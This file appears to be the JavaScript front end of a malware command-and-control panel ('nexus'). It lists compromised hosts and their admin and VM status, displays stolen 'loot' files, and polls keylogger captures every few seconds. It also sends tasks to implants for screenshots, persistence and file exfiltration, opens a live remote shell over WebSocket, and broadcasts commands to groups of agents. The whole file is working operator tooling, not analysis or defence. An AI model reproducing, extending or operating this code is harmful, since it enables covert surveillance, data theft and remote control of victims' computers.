let token = localStorage.getItem("nexus_token") || "";
let currentId = null;
let ws = null;
let agentsCache = [];
let keylogInterval = null;

const $ = (id) => document.getElementById(id);
const esc = (s) => String(s).replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");

async function api(path, opts = {}) {
  const headers = opts.headers || {};
  if (token) headers["Authorization"] = `Bearer ${token}`;
  const r = await fetch(path, { ...opts, headers });
  if (r.status === 401) { logout(); throw new Error("auth"); }
  if (!r.ok) throw new Error(await r.text());
  const ct = r.headers.get("content-type") || "";
  if (ct.includes("application/json")) return r.json();
  return r;
}

function showApp(yes) {
  $("login").classList.toggle("hidden", yes);
  $("app").classList.toggle("hidden", !yes);
}

function logout() {
  token = "";
  localStorage.removeItem("nexus_token");
  if (ws) ws.close();
  if (keylogInterval) clearInterval(keylogInterval);
  showApp(false);
}

$("btnLogin").onclick = async () => {
  $("loginErr").textContent = "";
  const f = new FormData();
  f.append("username", $("user").value);
  f.append("password", $("pass").value);
  try {
    const r = await fetch("/api/auth/login", { method:"POST", body:f });
    if (!r.ok) throw new Error("fail");
    const j = await r.json();
    token = j.token;
    localStorage.setItem("nexus_token", token);
    showApp(true);
    refresh();
  } catch { $("loginErr").textContent = "Invalid credentials"; }
};
$("user").onkeydown = (e) => e.key==="Enter" && $("pass").focus();
$("pass").onkeydown = (e) => e.key==="Enter" && $("btnLogin").click();
$("btnLogout").onclick = logout;

function switchView(name) {
  document.querySelectorAll("section[id^=view-]").forEach(s => s.classList.add("hidden"));
  const el = $(`view-${name}`);
  if (el) el.classList.remove("hidden");
  document.querySelectorAll(".nav-btn").forEach(b => b.classList.toggle("active", b.dataset.view === name));
  if (name === "events") loadEvents();
  if (name === "fleet") refresh();
}

document.querySelectorAll(".nav-btn").forEach(b => {
  b.onclick = () => switchView(b.dataset.view);
});

async function refresh() {
  agentsCache = await api("/api/agents");
  const on = agentsCache.filter(a => a.online).length;
  $("statOnline").textContent = `${on} online`;
  $("statTotal").textContent = `${agentsCache.length} total`;
  renderRows();
}

function renderRows() {
  const q = ($("search").value || "").toLowerCase();
  const tb = $("agentRows");
  tb.innerHTML = "";
  agentsCache.filter(a => JSON.stringify(a).toLowerCase().includes(q)).forEach(a => {
    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td><span class="dot ${a.online?"on":"off"}"></span></td>
      <td><code style="color:var(--acc3)">${esc(a.id).slice(0,12)}</code></td>
      <td><b>${esc(a.hostname||"")}</b></td>
      <td>${esc(a.username||"")}</td>
      <td>${esc(a.os||"")} ${esc(a.arch||"")}</td>
      <td>${esc(a.ip||"")}<div style="color:var(--mut);font-size:11px">${esc(a.internal_ip||"")}</div></td>
      <td><span class="pill ${a.is_admin?"yes":""}">${a.is_admin?"adm":"usr"}</span></td>
      <td><span class="pill ${a.is_vm?"vm":""}">${a.is_vm?"vm":"bm"}</span></td>
      <td style="color:var(--mut);font-size:11px">${esc((a.last_seen||"").replace("T"," ").slice(0,19))}</td>
      <td><button data-id="${a.id}" class="ghost" style="padding:6px 12px">open</button></td>`;
    tr.querySelector("button").onclick = () => openAgent(a.id);
    tb.appendChild(tr);
  });
}

$("search").oninput = renderRows;
$("btnRefresh").onclick = refresh;

async function openAgent(id) {
  currentId = id;
  $("view-fleet").classList.add("hidden");
  $("view-detail").classList.remove("hidden");
  const data = await api(`/api/agents/${id}`);
  const a = data.agent;
  $("detailTitle").textContent = `${a.hostname||id} (${a.online?"online":"offline"})`;
  $("sysBox").textContent = Object.entries(a).map(([k,v])=>`${k}: ${v}`).join("\n");
  const loot = (data.files||[]).map(f=>`<a href="/api/loot/${f.id}" target="_blank">${esc(f.path)} (${(f.size/1024).toFixed(1)}kb)</a>`).join("");
  $("lootList").innerHTML = loot || "no files";
  if (data.keylog && data.keylog.length) {
    $("keylogBox").textContent = data.keylog.slice(0,100).map(k=>`[${(k.ts||"").slice(11,19)}] ${esc(k.data||"")}`).join("\n");
  } else {
    $("keylogBox").textContent = "no keylog data";
  }
  connectTerm(id);
  if (keylogInterval) clearInterval(keylogInterval);
  keylogInterval = setInterval(async () => {
    if (!currentId) return;
    try {
      const d = await api(`/api/keylog/${currentId}`);
      if (d && d.length) {
        $("keylogBox").textContent = d.slice(0,100).map(k=>`[${(k.ts||"").slice(11,19)}] ${esc(k.data||"")}`).join("\n");
      }
    } catch {}
  }, 5000);
}

$("btnBack").onclick = () => {
  if (ws) ws.close();
  if (keylogInterval) clearInterval(keylogInterval);
  currentId = null;
  $("view-detail").classList.add("hidden");
  $("view-fleet").classList.remove("hidden");
  refresh();
};

async function task(type, payload="") {
  if (!currentId) return null;
  return api(`/api/agents/${currentId}/task`, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({type,payload})
  });
}

$("btnShot").onclick = () => task("screenshot");
$("btnPersist").onclick = () => task("persist");
$("btnSysinfo").onclick = () => task("sysinfo");
$("btnKeylog").onclick = () => task("keylogflush");
$("btnLs").onclick = async () => { await task("ls", $("pathInput").value); $("filesBox").textContent = "queued..."; };
$("btnPull").onclick = () => task("upload", $("pathInput").value);
$("btnDelete").onclick = async () => {
  if (!confirm("Delete agent?")) return;
  await api(`/api/agents/${currentId}`, { method:"DELETE" });
  $("btnBack").click();
};

function connectTerm(id) {
  if (ws) ws.close();
  $("termOut").textContent = "";
  $("termStatus").textContent = "connecting...";
  const proto = location.protocol==="https:"?"wss":"ws";
  ws = new WebSocket(`${proto}://${location.host}/ws/term/${id}?token=${encodeURIComponent(token)}`);
  ws.onopen = () => $("termStatus").textContent = "live";
  ws.onclose = () => { $("termStatus").textContent = "disconnected"; };
  ws.onmessage = ev => {
    const j = JSON.parse(ev.data);
    $("termOut").textContent += (j.output||"") + "\n";
    $("termOut").scrollTop = $("termOut").scrollHeight;
  };
  $("termIn").onkeydown = e => {
    if (e.key==="Enter" && ws && ws.readyState===1) {
      const cmd = $("termIn").value;
      $("termOut").textContent += `\n# ${cmd}\n`;
      ws.send(JSON.stringify({cmd}));
      $("termIn").value = "";
    }
  };
}

async function loadEvents() {
  try {
    const ev = await api("/api/events?limit=200");
    $("eventsBox").textContent = ev.map(e=>`[${(e.ts||"").slice(0,19)}] ${e.agent_id.slice(0,10)} | ${e.event_type} | ${esc(JSON.stringify(e.data||""))}`).join("\n");
  } catch {}
}

$("btnRefreshEvents").onclick = loadEvents;

$("btnBroadcast").onclick = async () => {
  const type = $("bcType").value;
  const payload = $("bcCmd").value;
  const group = $("bcGroup").value;
  try {
    const r = await api("/api/agents/broadcast", {
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({type,payload,group})
    });
    $("bcResult").textContent = `sent to ${r.sent} agents`;
  } catch(e) { $("bcResult").textContent = `error: ${e}`; }
};

if (token) {
  showApp(true);
  refresh();
  setInterval(refresh, 12000);
} else {
  showApp(false);
             }
